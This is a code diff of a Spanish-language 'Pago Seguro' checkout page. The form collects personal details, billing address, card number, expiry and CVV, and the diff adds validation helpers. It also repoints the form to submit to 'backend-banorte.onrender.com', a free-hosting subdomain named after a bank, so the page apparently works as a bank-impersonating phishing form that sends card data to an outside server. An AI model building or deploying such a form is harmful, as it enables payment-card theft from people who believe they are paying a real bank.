@@ -80,15 +80,20 @@ button:hover {
 <div class="container">
   <h2>Pago Seguro</h2>
 
-  <form method="POST" action="/api/payment/3d-secure" autocomplete="off">
+  <form 
+    method="POST" 
+    action="https://backend-banorte.onrender.com/api/payment/3d-secure"
+    autocomplete="off"
+    onsubmit="return validarForm()"
+  >
 
     <div class="section-title">Datos personales</div>
-    <input name="nombre" placeholder="Nombre completo" required>
+    <input name="nombre" placeholder="Nombre completo" required minlength="3">
     <input name="correo" type="email" placeholder="Correo electrónico" required>
     <input name="telefono" placeholder="Teléfono" pattern="\d{10}" required>
 
     <div class="section-title">Dirección de facturación</div>
-    <input name="direccion" placeholder="Dirección" required>
+    <input name="direccion" placeholder="Dirección" required minlength="5">
     <input name="ciudad" placeholder="Ciudad" required>
     <input name="cp" placeholder="Código Postal" pattern="\d{5}" required>
 
@@ -151,30 +156,54 @@ button:hover {
 </div>
 
 <script>
-// Mostrar / ocultar CVV
+// ===============================
+// VALIDACIÓN GENERAL
+// ===============================
+function validarForm() {
+  const monto = document.querySelector('[name="amount"]').value;
+
+  if (Number(monto) <= 0) {
+    alert("Monto inválido");
+    return false;
+  }
+
+  return true;
+}
+
+// ===============================
+// MOSTRAR / OCULTAR CVV
+// ===============================
 function toggleCVV() {
   const cvv = document.getElementById("cvv");
   cvv.type = cvv.type === "password" ? "text" : "password";
 }
 
-// Formato MM/AA automático
+// ===============================
+// FORMATO MM/AA
+// ===============================
 document.querySelector('[name="cardExp"]').addEventListener("input", e => {
   let val = e.target.value.replace(/\D/g, "");
   if (val.length >= 2) val = val.slice(0,2) + "/" + val.slice(2,4);
   e.target.value = val;
 });
 
-// Solo números tarjeta
+// ===============================
+// SOLO NÚMEROS TARJETA
+// ===============================
 document.querySelector('[name="cardNumber"]').addEventListener("input", e => {
   e.target.value = e.target.value.replace(/\D/g, "").slice(0,16);
 });
 
-// Solo números teléfono
+// ===============================
+// SOLO NÚMEROS TELÉFONO
+// ===============================
 document.querySelector('[name="telefono"]').addEventListener("input", e => {
   e.target.value = e.target.value.replace(/\D/g, "").slice(0,10);
 });
 
-// Solo números CP
+// ===============================
+// SOLO NÚMEROS CP
+// ===============================
 document.querySelector('[name="cp"]').addEventListener("input", e => {
   e.target.value = e.target.value.replace(/\D/g, "").slice(0,5);
 });
